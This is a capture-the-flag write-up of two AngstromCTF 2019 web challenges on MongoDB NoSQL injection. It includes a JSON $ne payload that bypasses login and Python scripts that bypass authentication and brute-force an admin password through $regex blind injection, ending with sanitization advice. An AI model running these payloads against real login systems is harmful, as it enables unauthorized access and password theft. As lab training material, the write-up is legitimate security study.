---
title: "AngstromCTF 2019 — No SEQUELS & No SEQUELS 2"
date: 2019-04-26
description: "MongoDB authentication bypass using NoSQL injection ($ne operator) and blind injection with $regex to extract the admin password character by character."
tags: ["nosql-injection", "mongodb", "web", "authentication-bypass", "blind-injection", "python"]
platform: "AngstromCTF"
difficulty: "Medium"
category: "Web"
points: 170
author: "Yassine"
draft: false
---

Two related challenges from AngstromCTF 2019 — both exploiting MongoDB's query operators for NoSQL injection.

## No SEQUELS 1 — Authentication Bypass

**Category:** Web | **Points:** 50

### Challenge Description

> The prequels sucked, and the sequels aren't much better, but at least we always have the original trilogy.
> Hint: *MongoDB is a safer alternative to SQL, right?*

### Analysis

The application used MongoDB for authentication. We were given the source code:

![Application source code showing unsanitized input](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1556371044/1_xKB1P9_JsMbdjYLkCsnHvw.png)

The body parser accepted JSON (`Content-Type: application/json`), meaning we could inject MongoDB query operators.

```javascript
var user = req.body.username;
var pass = req.body.password;
```

### Exploitation

By sending JSON with `$ne` (not-equal) operators, we bypass authentication:

```http
POST /login HTTP/1.1
Content-Type: application/json

{
    "username": {"$ne": null},
    "password": {"$ne": null}
}
```

This makes MongoDB return the first user in the collection, granting access.

### Python Exploit

```python
import requests
import re

URL = "https://nosequels.2019.chall.actf.co/login"
session = requests.Session()

# Get initial token
jwt_token_re = re.compile(r"token=(.*);")
token_req = session.get(URL)
cookies = {}
if token_req.status_code == 200:
    m = re.search(jwt_token_re, token_req.headers["Set-Cookie"])
    if m:
        cookies["token"] = str(m.group(1))

# Send NoSQL injection payload
payload = {"username": {"$ne": None}, "password": {"$ne": None}}
req = session.post(URL, json=payload, cookies=cookies, verify=False)

flag_re = re.compile(r"actf{.*}")
m = re.search(flag_re, req.text)
if m:
    print("FLAG:", m.group(0))
```

**Flag:** `actf{no_sql_doesn't_mean_no_vuln}`

---

## No SEQUELS 2 — Blind NoSQL Injection

**Points:** 120

### Challenge Description

After authentication, the `/site` page requires the **admin password** — no more database queries allowed. We need to extract it blindly.

![The /site page requiring admin password](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1556487393/1_zD92g6-1Z1HnRlHcfkrbBg.png)

### Strategy

Use `$regex` with `^char.*` pattern to brute-force the password one character at a time. A `302` redirect means the character is correct.

```python
import requests
import string
import re

session = requests.Session()
URL = "https://nosequels.2019.chall.actf.co/login"

# Get initial token
jwt_token_re = re.compile(r"token=(.*);")
dummy = session.get(URL)
cookies = {}
m = re.search(jwt_token_re, dummy.headers["Set-Cookie"])
if m:
    cookies["token"] = str(m.group(1))

# Blind brute-force
charset = string.ascii_letters + string.digits + "!@#$%^()@_{}"
password = ""
found = True

while found:
    found = False
    for char in charset:
        test = password + char
        payload = {
            "username": {"$eq": "admin"},
            "password": {"$regex": f"^{test}.*"}
        }
        req = session.post(URL, verify=False, cookies=cookies,
                          json=payload, allow_redirects=False)
        if req.status_code == 302:
            password = test
            found = True
            print(f"[+] Password so far: {password}")
            m = re.search(jwt_token_re, req.headers.get("Set-Cookie", ""))
            if m:
                cookies["token"] = str(m.group(1))
            if len(password) == 14:
                found = False
            break

print(f"[+] Admin password: {password}")
```

**Flag:** `actf{still_no_sql_in_the_sequel}`

### Key Takeaways

- NoSQL databases are **not** immune to injection — operators like `$ne`, `$gt`, `$regex` can be weaponized
- Always sanitize and type-check user input before passing to database queries
- Use `express-mongo-sanitize` or similar middleware to strip `$` prefixes from user input
